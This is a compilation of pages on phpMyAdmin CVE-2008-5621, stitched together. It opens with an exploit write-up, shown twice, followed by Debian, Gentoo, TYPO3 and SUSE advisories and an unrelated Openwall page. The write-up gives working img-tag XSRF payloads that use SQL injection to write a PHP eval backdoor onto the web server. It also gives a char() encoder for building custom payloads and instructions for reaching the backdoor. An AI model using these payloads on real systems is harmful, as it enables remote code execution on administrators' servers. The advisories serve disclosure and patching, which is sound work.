Written by Michael Brooks
Special Thanks to str0ke and rGod
Intro:
phpMyAdmin is by far the most popular PHP project. Between
phpmyadmin and the xampp project there are more than 34+ million
downloads from sourceforge.net . This exploit was released along
side XSRF attacks against XAMPP and Simple Directory Listing
effectively breaking the top 3 php projects in the same day.
Vulnerable Software info:
SQL injection in phpMyAdmin by means of XSRF.
Exploit tested on Version 3.1.0 release on: 2008-12-01
Works with magic\_quotes\_gpc=On or Off.
Exploit information:
This is a Remote php code execution PoC exploit. The exploit is
dropping a php backdoor into /var/www/backdoor.php, this attack will
not work on the newest Ubuntu or Fedora... machines due to AppArmor
and SELinux respectively.
This is a XSRF attack to access SQL Injection so the same rules for
executing XSRF attacks still apply.
Steps for exploitation:
1)The Victim's browser must be authenticated to phpMyAdmin at the time
of attack.
2)You must know the URL to phpMyAdmin.
3)Finly, to execute the attack the Victim's browser then needs to
view the malicious img tag:
Exploit for \*nix:
<html>
<img src="http://10.1.1.10/phpmyadmin/tbl\_structure.php?db=information\_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+63%2C+62%29+into+outfile+%22%2Fvar%2Fwww%2Fbackdoor.php%22+--+1">
</html>
path:
/var/www/backdoor.php
backdoor:
<?php eval($\_GET[e]);?>
Exploit for a Default XAMPP for Windows Version 1.6.8:
<html>
<img src="http://10.1.1.10/phpmyadmin/tbl\_structure.php?db=information\_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+115%2C+116%2C+114%2C+105%2C+112%2C+115%2C+108%2C+97%2C+115%2C+104%2C+101%2C+115%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+41%2C+59%2C+63%2C+62%29+into+outfile+%22c%3A%2Fxampp%2Fhtdocs%2Fbackdoor.php%22+--+1">
</html>
path:
c:/xampp/htdocs/backdoor.php
backdoor:
<?php eval(stripslashes($\_GET[e]));?>
The backdoor can be accessed via
http://10.1.1.10/backdoor.php?e=phpinfo();
As a side note, this attack is only GET based so no JavaScript or
ActionScript required! Screw you NoScript!!!
Technical Details:
The exact sql query that is being executed:
SELECT COUNT(\*) FROM `TABLES` where 0 union select char(60, 63, 112,
104, 112, 32, 101, 118, 97, 108, 40, 36, 95, 71, 69, 84, 91, 101, 93,
41, 63, 62) into outfile "/var/www/backdoor.php" -- 1`;
The char() mysql function is being used because the first SQL query is
selecting integer values. The following php code can be used to
build a custom payload, the current payload is: <?php
eval($\_GET[e])?>
<?php
print charEncode($\_GET[code]);
function charEncode($string){
$char="char(";
$size=strlen($string);
for($x=0;$x<$size;$x++){
$char.=ord($string[$x]).", ";
}
$char[strlen($char)-2]=")%00";
return $char;
}
?>
retroGod showed me this encoding method back when milw0rm still had a forum.
By default, if this query is malformed it will redirect you to a
blank query window. This fooled me for a while, but then I modified
a line and then I could see that I was in fact causing a mysql error.
./phpmyadmin/libraries/dbi/mysql.dbi.lib.php line 126:
return mysql\_query($query,$link);
change it to:
return mysql\_query($query,$link) or die($query."<br>".mysql\_error($link));
The query that is vulnerable to sql injection is being built in
./phpmyadmin/libraries/db\_table\_exists.lib.php on line: 63
$\_result = PMA\_DBI\_try\_query(
'SELECT COUNT(\*) FROM `' .
PMA\_sqlAddslashes($table, true) . '`;',
null, PMA\_DBI\_QUERY\_STORE);
The PMA\_sqlAddslashes() only disrupts the use of single quotes '.
This function doesn't protect against sql injection because it ignores
back-ticks ` and double-quotes ".
This attack is not a textbook example of XSRF, because phpMyAdmin does
have protection against XSRF. The token used to protect requests is
generated in a secure manner:
./phpmyadmin/libraries/session.ic.php line 96:
if (!isset($\_SESSION[' PMA\_token '])) {
$\_SESSION[' PMA\_token '] = md5(uniqid(rand(), true));
}
As a note the call to md5(); is superstitious. It doesn't add nor
does it subtract to the session security. Possible md5() collisions do
not affect the integrity of the cryptographic nonce.
The vulnerability is because some request variables are exempt from
token's protection. For instance the request variables 'db' and
'table' used in the attack are not unset().
./phpmyadmin/libraries/common.inc.php line 389:
if (! PMA\_isValid($\_REQUEST['token']) || $\_SESSION[' PMA\_token '] !=
$\_REQUEST['token']) {
/\*\*
\* List of parameters which are allowed from unsafe source
\*/
$allow\_list = array(
/\* needed for direct access, see FAQ 1.34
\* also, server needed for cookie login screen (multi-server)
\*/
'server', 'db', 'table', 'target',
/\* Session ID \*/
'phpMyAdmin',
/\* Cookie preferences \*/
'pma\_lang', 'pma\_charset', 'pma\_collation\_connection',
/\* Possible login form \*/
'pma\_servername', 'pma\_username', 'pma\_password',
/\* rajk - for playing blobstreamable media \*/
'media\_type', 'custom\_type', 'bs\_reference',
/\* rajk - for changing BLOB repository file MIME type \*/
'bs\_db', 'bs\_table', 'bs\_ref', 'bs\_new\_mime\_type'
);
/\*\*
\* Require cleanup functions
\*/
require\_once './libraries/cleanup.lib.php';
/\*\*
\* Do actual cleanup
\*/
PMA\_remove\_request\_vars($allow\_list);
}
and PMA\_remove\_request\_vars() is in ./phpmyadmin/librarires/cleanup.lib.php:
function PMA\_remove\_request\_vars(&$whitelist)
{
// do not check only $\_REQUEST because it could have been overwritten
// and use type casting because the variables could have become
// strings
$keys = array\_keys(array\_merge((array)$\_REQUEST, (array)$\_GET,
(array)$\_POST, (array)$\_COOKIE));
foreach($keys as $key) {
if (! in\_array($key, $whitelist)) {
unset($\_REQUEST[$key], $\_GET[$key], $\_POST[$key], $GLOBALS[$key]);
} else {
// allowed stuff could be compromised so escape it
// we require it to be a string
if (isset($\_REQUEST[$key]) && ! is\_string($\_REQUEST[$key])) {
unset($\_REQUEST[$key]);
}
if (isset($\_POST[$key]) && ! is\_string($\_POST[$key])) {
unset($\_POST[$key]);
}
if (isset($\_COOKIE[$key]) && ! is\_string($\_COOKIE[$key])) {
unset($\_COOKIE[$key]);
}
if (isset($\_GET[$key]) && ! is\_string($\_GET[$key])) {
unset($\_GET[$key]);
}
}
}
}
As a note, the & in this function declaration
PMA\_remove\_request\_vars(&$whitelist) means to pass the variable by
reference, however this function doesn't use that variable reference.
Again this is superstitious because it has no effect on the code
its self.

Subject: CVE-2008-5621 is a duplicate (was: Re: CVE request:
     phpMyAdmin < 3.1.1.0 (SQL injection through XSRF on several pages ))

Hi Steve,

Sorry for responding this late, I missed the initial assignment.

On Wed, December 17, 2008 02:52, Steven M. Christey wrote:

I believe this is a misinterpretation of the advisory, and upstream has
confirmed that to me. There is only one issue and that is the one which
CVE-2008-5621 refers to.

I suspect that this comes from a misundertanding of the text of this
advisory:
<http://www.phpmyadmin.net/home_page/security/PMASA-2008-10.php>
The problem is in a backend function, and this function is called from
multiple pages, which means that the issue can be exploited through
"several pages" as mentioned in the advisory which all accept the "table"
parameter.

The patch referenced from the advisory patches one line in the backend
function and is sufficient to resolve the things mentioned in
PMASA-2008-10.

I propose that CVE-2008-5622 gets marked as a duplicate of CVE-2008-5621
or rejected.

cheers,
Thijs

Package        : phpmyadmin
Vulnerability  : insufficient input sanitising
Problem type   : remote
Debian-specific: no
CVE Id(s)      : CVE-2008-5621

Michael Brooks discovered that phpMyAdmin, a tool to administrate MySQL
over the web, performs insufficient input sanitising allowing a user
assisted remote attacker to execute code on the webserver.

For the stable distribution (etch), this problem has been fixed in version
2.9.1.1-10.

For the testing distribution (lenny) and unstable distribution (sid), this
problem has been fixed in version 2.11.8.1-5.

We recommend that you upgrade your phpmyadmin package.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

**Vulnerable App:**

```
Written by Michael Brooks
Special Thanks to str0ke and rGod

Intro:
phpMyAdmin is by far the most popular PHP project.    Between
phpmyadmin  and the xampp project  there are more than 34+ million
downloads from sourceforge.net .   This exploit was released along
side  XSRF attacks against XAMPP and Simple Directory Listing
effectively breaking the top 3 php projects in the same day.

Vulnerable Software info:
SQL injection in phpMyAdmin by means of XSRF.
Exploit tested on Version 3.1.0  release on: 2008-12-01
Works with magic_quotes_gpc=On or Off.

Exploit information:
This is a Remote php code execution PoC exploit.   The exploit is
dropping a php backdoor into /var/www/backdoor.php,  this attack will
not work on the newest Ubuntu or Fedora... machines due to AppArmor
and SELinux respectively.

This is a XSRF attack to access SQL Injection so the same rules for
executing XSRF attacks still apply.
Steps for exploitation:
1)The Victim's browser must be authenticated to phpMyAdmin at the time
of attack.
2)You must know the URL to phpMyAdmin.
3)Finly,  to execute the attack the Victim's browser then needs to
view the malicious img tag:

Exploit for *nix:
<html>
<img src="http://10.1.1.10/phpmyadmin/tbl_structure.php?db=information_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+63%2C+62%29+into+outfile+%22%2Fvar%2Fwww%2Fbackdoor.php%22+--+1">
</html>
path:
/var/www/backdoor.php
backdoor:
<?php eval($_GET[e]);?>

Exploit for a Default XAMPP for Windows Version 1.6.8:
<html>
<img src="http://10.1.1.10/phpmyadmin/tbl_structure.php?db=information_schema&table=TABLES%60+where+0+union+select+char%2860%2C+63%2C+112%2C+104%2C+112%2C+32%2C+101%2C+118%2C+97%2C+108%2C+40%2C+115%2C+116%2C+114%2C+105%2C+112%2C+115%2C+108%2C+97%2C+115%2C+104%2C+101%2C+115%2C+40%2C+36%2C+95%2C+71%2C+69%2C+84%2C+91%2C+101%2C+93%2C+41%2C+41%2C+59%2C+63%2C+62%29+into+outfile+%22c%3A%2Fxampp%2Fhtdocs%2Fbackdoor.php%22+--+1">
</html>
path:
c:/xampp/htdocs/backdoor.php
backdoor:
<?php eval(stripslashes($_GET[e]));?>

The backdoor can be accessed via
http://10.1.1.10/backdoor.php?e=phpinfo();

As a side note, this attack is only GET based so no JavaScript or
ActionScript required!  Screw you NoScript!!!

Technical Details:
The exact sql query that is being executed:
SELECT COUNT(*) FROM `TABLES` where 0 union select char(60, 63, 112,
104, 112, 32, 101, 118, 97, 108, 40, 36, 95, 71, 69, 84, 91, 101, 93,
41, 63, 62) into outfile "/var/www/backdoor.php" -- 1`;

The char() mysql function is being used because the first SQL query is
selecting integer values.    The following php code can be used to
build a custom payload,  the current payload is: <?php
eval($_GET[e])?>

<?php
print charEncode($_GET[code]);
function charEncode($string){
	$char="char(";
	$size=strlen($string);
	for($x=0;$x<$size;$x++){
		$char.=ord($string[$x]).", ";
	}
	$char[strlen($char)-2]=")%00";
	return $char;
}
?>
retroGod  showed me this encoding method back when milw0rm still had a forum.

By default,  if this query is malformed it will redirect you to a
blank query window.  This fooled me for a while,  but then I modified
a line and then I could see that I was in fact causing a mysql error.
./phpmyadmin/libraries/dbi/mysql.dbi.lib.php line 126:
return mysql_query($query,$link);
change it to:
return mysql_query($query,$link) or die($query."<br>".mysql_error($link));

The query that is vulnerable to sql injection is being built in
./phpmyadmin/libraries/db_table_exists.lib.php on line: 63
		$_result = PMA_DBI_try_query(
                   'SELECT COUNT(*) FROM `' .
PMA_sqlAddslashes($table, true) . '`;',
                    null, PMA_DBI_QUERY_STORE);

The PMA_sqlAddslashes() only disrupts the use of single quotes '.
This function doesn't protect against sql injection because it ignores
back-ticks ` and  double-quotes ".

This attack is not a textbook example of XSRF, because phpMyAdmin does
have protection against XSRF.  The token used to protect requests is
generated in a secure manner:
./phpmyadmin/libraries/session.ic.php line 96:
if (!isset($_SESSION[' PMA_token '])) {
    $_SESSION[' PMA_token '] = md5(uniqid(rand(), true));
}
As a note the call to md5(); is superstitious.  It doesn't add nor
does it subtract to the session security. Possible md5() collisions do
not affect the integrity of the cryptographic nonce.

The vulnerability is because some request variables are exempt from
token's protection.  For instance the request variables 'db' and
'table'  used in the attack are not unset().
./phpmyadmin/libraries/common.inc.php line 389:
if (! PMA_isValid($_REQUEST['token']) || $_SESSION[' PMA_token '] !=
$_REQUEST['token']) {
    /**
     *  List of parameters which are allowed from unsafe source
     */
    $allow_list = array(
        /* needed for direct access, see FAQ 1.34
         * also, server needed for cookie login screen (multi-server)
         */
        'server', 'db', 'table', 'target',
        /* Session ID */
        'phpMyAdmin',
        /* Cookie preferences */
        'pma_lang', 'pma_charset', 'pma_collation_connection',
        /* Possible login form */
        'pma_servername', 'pma_username', 'pma_password',
        /* rajk - for playing blobstreamable media */
        'media_type', 'custom_type', 'bs_reference',
        /* rajk - for changing BLOB repository file MIME type */
        'bs_db', 'bs_table', 'bs_ref', 'bs_new_mime_type'
    );
    /**
     * Require cleanup functions
     */
    require_once './libraries/cleanup.lib.php';
    /**
     * Do actual cleanup
     */
    PMA_remove_request_vars($allow_list);

}

and  PMA_remove_request_vars() is in ./phpmyadmin/librarires/cleanup.lib.php:

function PMA_remove_request_vars(&$whitelist)
{
    // do not check only $_REQUEST because it could have been overwritten
    // and use type casting because the variables could have become
    // strings
    $keys = array_keys(array_merge((array)$_REQUEST, (array)$_GET,
(array)$_POST, (array)$_COOKIE));

    foreach($keys as $key) {
        if (! in_array($key, $whitelist)) {
            unset($_REQUEST[$key], $_GET[$key], $_POST[$key], $GLOBALS[$key]);
        } else {
            // allowed stuff could be compromised so escape it
            // we require it to be a string
            if (isset($_REQUEST[$key]) && ! is_string($_REQUEST[$key])) {
                unset($_REQUEST[$key]);
            }
            if (isset($_POST[$key]) && ! is_string($_POST[$key])) {
                unset($_POST[$key]);
            }
            if (isset($_COOKIE[$key]) && ! is_string($_COOKIE[$key])) {
                unset($_COOKIE[$key]);
            }
            if (isset($_GET[$key]) && ! is_string($_GET[$key])) {
                unset($_GET[$key]);
            }
        }
    }
}
As a note,  the & in this function declaration
PMA_remove_request_vars(&$whitelist) means to pass the variable by
reference,  however this function doesn't use that variable reference.
   Again this is superstitious because it has no effect on the code
its self.

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# phpMyAdmin: Multiple vulnerabilities â GLSA **200903-32**

Multiple vulnerabilities have been discovered in phpMyAdmin, the worst of
which may allow for remote code execution.

### Affected packages

| Package | **dev-db/phpmyadmin** on all architectures |
| --- | --- |
| Affected versions | < **2.11.9.4** |
| Unaffected versions | >= **2.11.9.4** |

### Background

phpMyAdmin is a web-based management tool for MySQL databases.

### Description

Multiple vulnerabilities have been reported in phpMyAdmin:

* libraries/database\_interface.lib.php in phpMyAdmin allows remote
  authenticated users to execute arbitrary code via a request to
  server\_databases.php with a sort\_by parameter containing PHP sequences,
  which are processed by create\_function (CVE-2008-4096).
* Cross-site scripting (XSS) vulnerability in pmd\_pdf.php allows remote
  attackers to inject arbitrary web script or HTML via the db parameter,
  a different vector than CVE-2006-6942 and CVE-2007-5977
  (CVE-2008-4775).
* Cross-site request forgery (CSRF) vulnerability in phpMyAdmin allows
  remote authenticated attackers to perform unauthorized actions as the
  administrator via a link or IMG tag to tbl\_structure.php with a
  modified table parameter. NOTE: this can be leveraged to conduct SQL
  injection attacks and execute arbitrary code (CVE-2008-5621).
* Multiple cross-site request forgery (CSRF) vulnerabilities in
  phpMyAdmin allow remote attackers to conduct SQL injection attacks via
  unknown vectors related to the table parameter, a different vector than
  CVE-2008-5621 (CVE-2008-5622).

### Impact

A remote attacker may execute arbitrary code with the rights of the
webserver, inject and execute SQL with the rights of phpMyAdmin or
conduct XSS attacks against other users.

### Workaround

There is no known workaround at this time.

### Resolution

All phpMyAdmin users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-db/phpmyadmin-2.11.9.4"
```

# TYPO3-20081222-1: TYPO3 Security Bulletin

It has been discovered that the extension phpMyAdmin (phpmyadmin) is vulnerable to SQL injections via XSRF.

**Component Type:** Third party extension. This extension is not a part of the TYPO3 default installation.

**Affected Versions:** Version 4.1.1 and all versions below

**Vulnerability Type:** SQL injection through XSRF

**Severity:** Low

**References:** [PMASA-2008-10](http://www.phpmyadmin.net/home_page/security/PMASA-2008-10.php)

**Problem Description:** A logged-in backend user can be subject of SQL injection through cross site request forgery. Several scripts in phpMyAdmin are vulnerable and the attack can be made through *table* parameter. The vendor considers this vulnerability to be serious.

**Solution:** An updated version 4.2.0 is available from the TYPO3 extension manager and at <http://typo3.org/extensions/repository/view/phpmyadmin/4.2.0/> (It contains the standalone phpMyAdmin version 3.1.1). Users of the extension are advised to update the extension as soon as possible.

**Note:** The 3rd party TYPO3 extension phpmyadmin embeds the 3rd party stand alone application [phpMyAdmin](http://www.phpmyadmin.net/home_page/index.php) and makes it available from the TYPO3 backend. Numerous vulnerabilities within the stand alone PHP application phpMyAdmin were reported in the recent past and led to security updates of the TYPO3 extension phpmyadmin (for further details, see bulletins [TYPO3-20081110-1](http://typo3.org/?id=2346), [TYPO3-20080924-1](http://typo3.org/?id=2336), [TYPO3-20080916-1](http://typo3.org/?id=2335), [TYPO3-20080701-2](http://typo3.org/?id=2323)). Although the current maintainer of the TYPO3 extension phpmyadmin is monitoring the security announcements of the upstream version actively and immediately provides us with security updates, the TYPO3 Security Team recommends to use the TYPO3 extension phpmyadmin in development environment only. If the functionality of phpMyAdmin is needed on a live site, an alternative could be to use the standalone phpMyAdmin application instead and making sure that its script files are not publicly accessible (Subnet/IP access restriction; accessible by VPN only; etc.).

For users of old TYPO3 versions running on obsolete PHP4 environments: The extension maintainer provides a specific phpMyAdmin extension branch for users of PHP4 exclusively [on his web site](http://www.mehrwert.de/content-management/typo3-extensions/). The extension maintainer informed us that there will also be a security update (3.4.3) available for this branch which replaces the used version of standalone phpMyAdmin with version 2.9.11.4.

**General advice:** Follow the recommendations that are given in the [TYPO3 Security Cookbook](http://typo3.org/fileadmin/security-team/typo3_security_cookbook_v-0.5.pdf). Please subscribe to the [typo3-announce mailing list](http://lists.typo3.org/cgi-bin/mailman/listinfo/typo3-announce) to receive future Security Bulletins via E-mail.

**Credits:** The TYPO3 Security Team wishes to thank the extension maintainer Andreas Kundoch for fixing the issue by upgrading phpMyAdmin to the latest stable version.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- boinc-client
The boinc-client was missing return value checks for openssl function
calls. (CVE-2009-0126)
Affected products: openSUSE 11.1
- xrdp
This update fixes multiple buffer overflows that can be exploited
remotely to execute arbitrary code. (CVE-2008-5902, CVE-2008-5903,
CVE-2008-5904)
Additionally xrdp does not register remote session as local anymore.
Affected products: openSUSE 11.1
- phpMyAdmin
A version upgrade to phpMyAdmin 2.11.9.4 to fix various security
bugs. (CVE-2008-2960, CVE-2008-3197, CVE-2008-1149, CVE-2008-1567,
CVE-2008-1924, CVE-2008-4096, CVE-2008-4326, CVE-2008-5621, CVE-2008-5622)
Affected products: openSUSE 10.3-11.0
- libnasl
This update of libnasl adds missing return value checks for openssl
function calls. (CVE-2009-0125)
Affected products: openSUSE 10.3-11.0
- moodle
Insufficient quoting of wiki page titles allowed attackers to
conduct cross site scripting (XSS) attacks. (CVE-2008-5432)
Affected products: openSUSE 10.3-11.0
- net-snmp
Remote attackers could crash net-snmp via GETBULK-Request
(CVE-2008-4309).
In addition the following non-security issues have been fixed:
- typo in error message
- make OIDs longer than 256 chars work
- typo in the snmpd init script to really load all agents
- logrotate config to restart the snmptrapd as well
Affected products: SLES9, NLD9, SLES10, SLED 10
- audiofile
A heap-overflow in libaudiofile was fixed. The overflow existsed
in the WAV processing code and can be exploited to execute arbi-
trary code. (CVE-2008-5824)
Affected products: openSUSE 10.3-11.1, OES, SLES9, NLD9, SLES 10,
SLED10
- XFree86/xterm
XTerm evaluated various ANSI Escape sequences so that command
execution was possible if an attacker could pipe raw data to an
xterm. (CVE-2008-2383)
(It is usually not recommended to display raw data on an xterm.)
Support for Matrox G200EV/G200WB cards was added.
Affected products: OES, SLES9, NLD9
- amarok
This update of amarok fixes several integer overflows and unchecked
memory allocations that can be exploited by malformed Audible digital
audio files. These bugs could be used in a user-assisted attack sce-
nario to execute arbitrary code remotely. (CVE-2009-0135, CVE-2009-
0136)
Affected products: openSUSE 10.3-11.1, SLES10, SLED10
- libpng

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
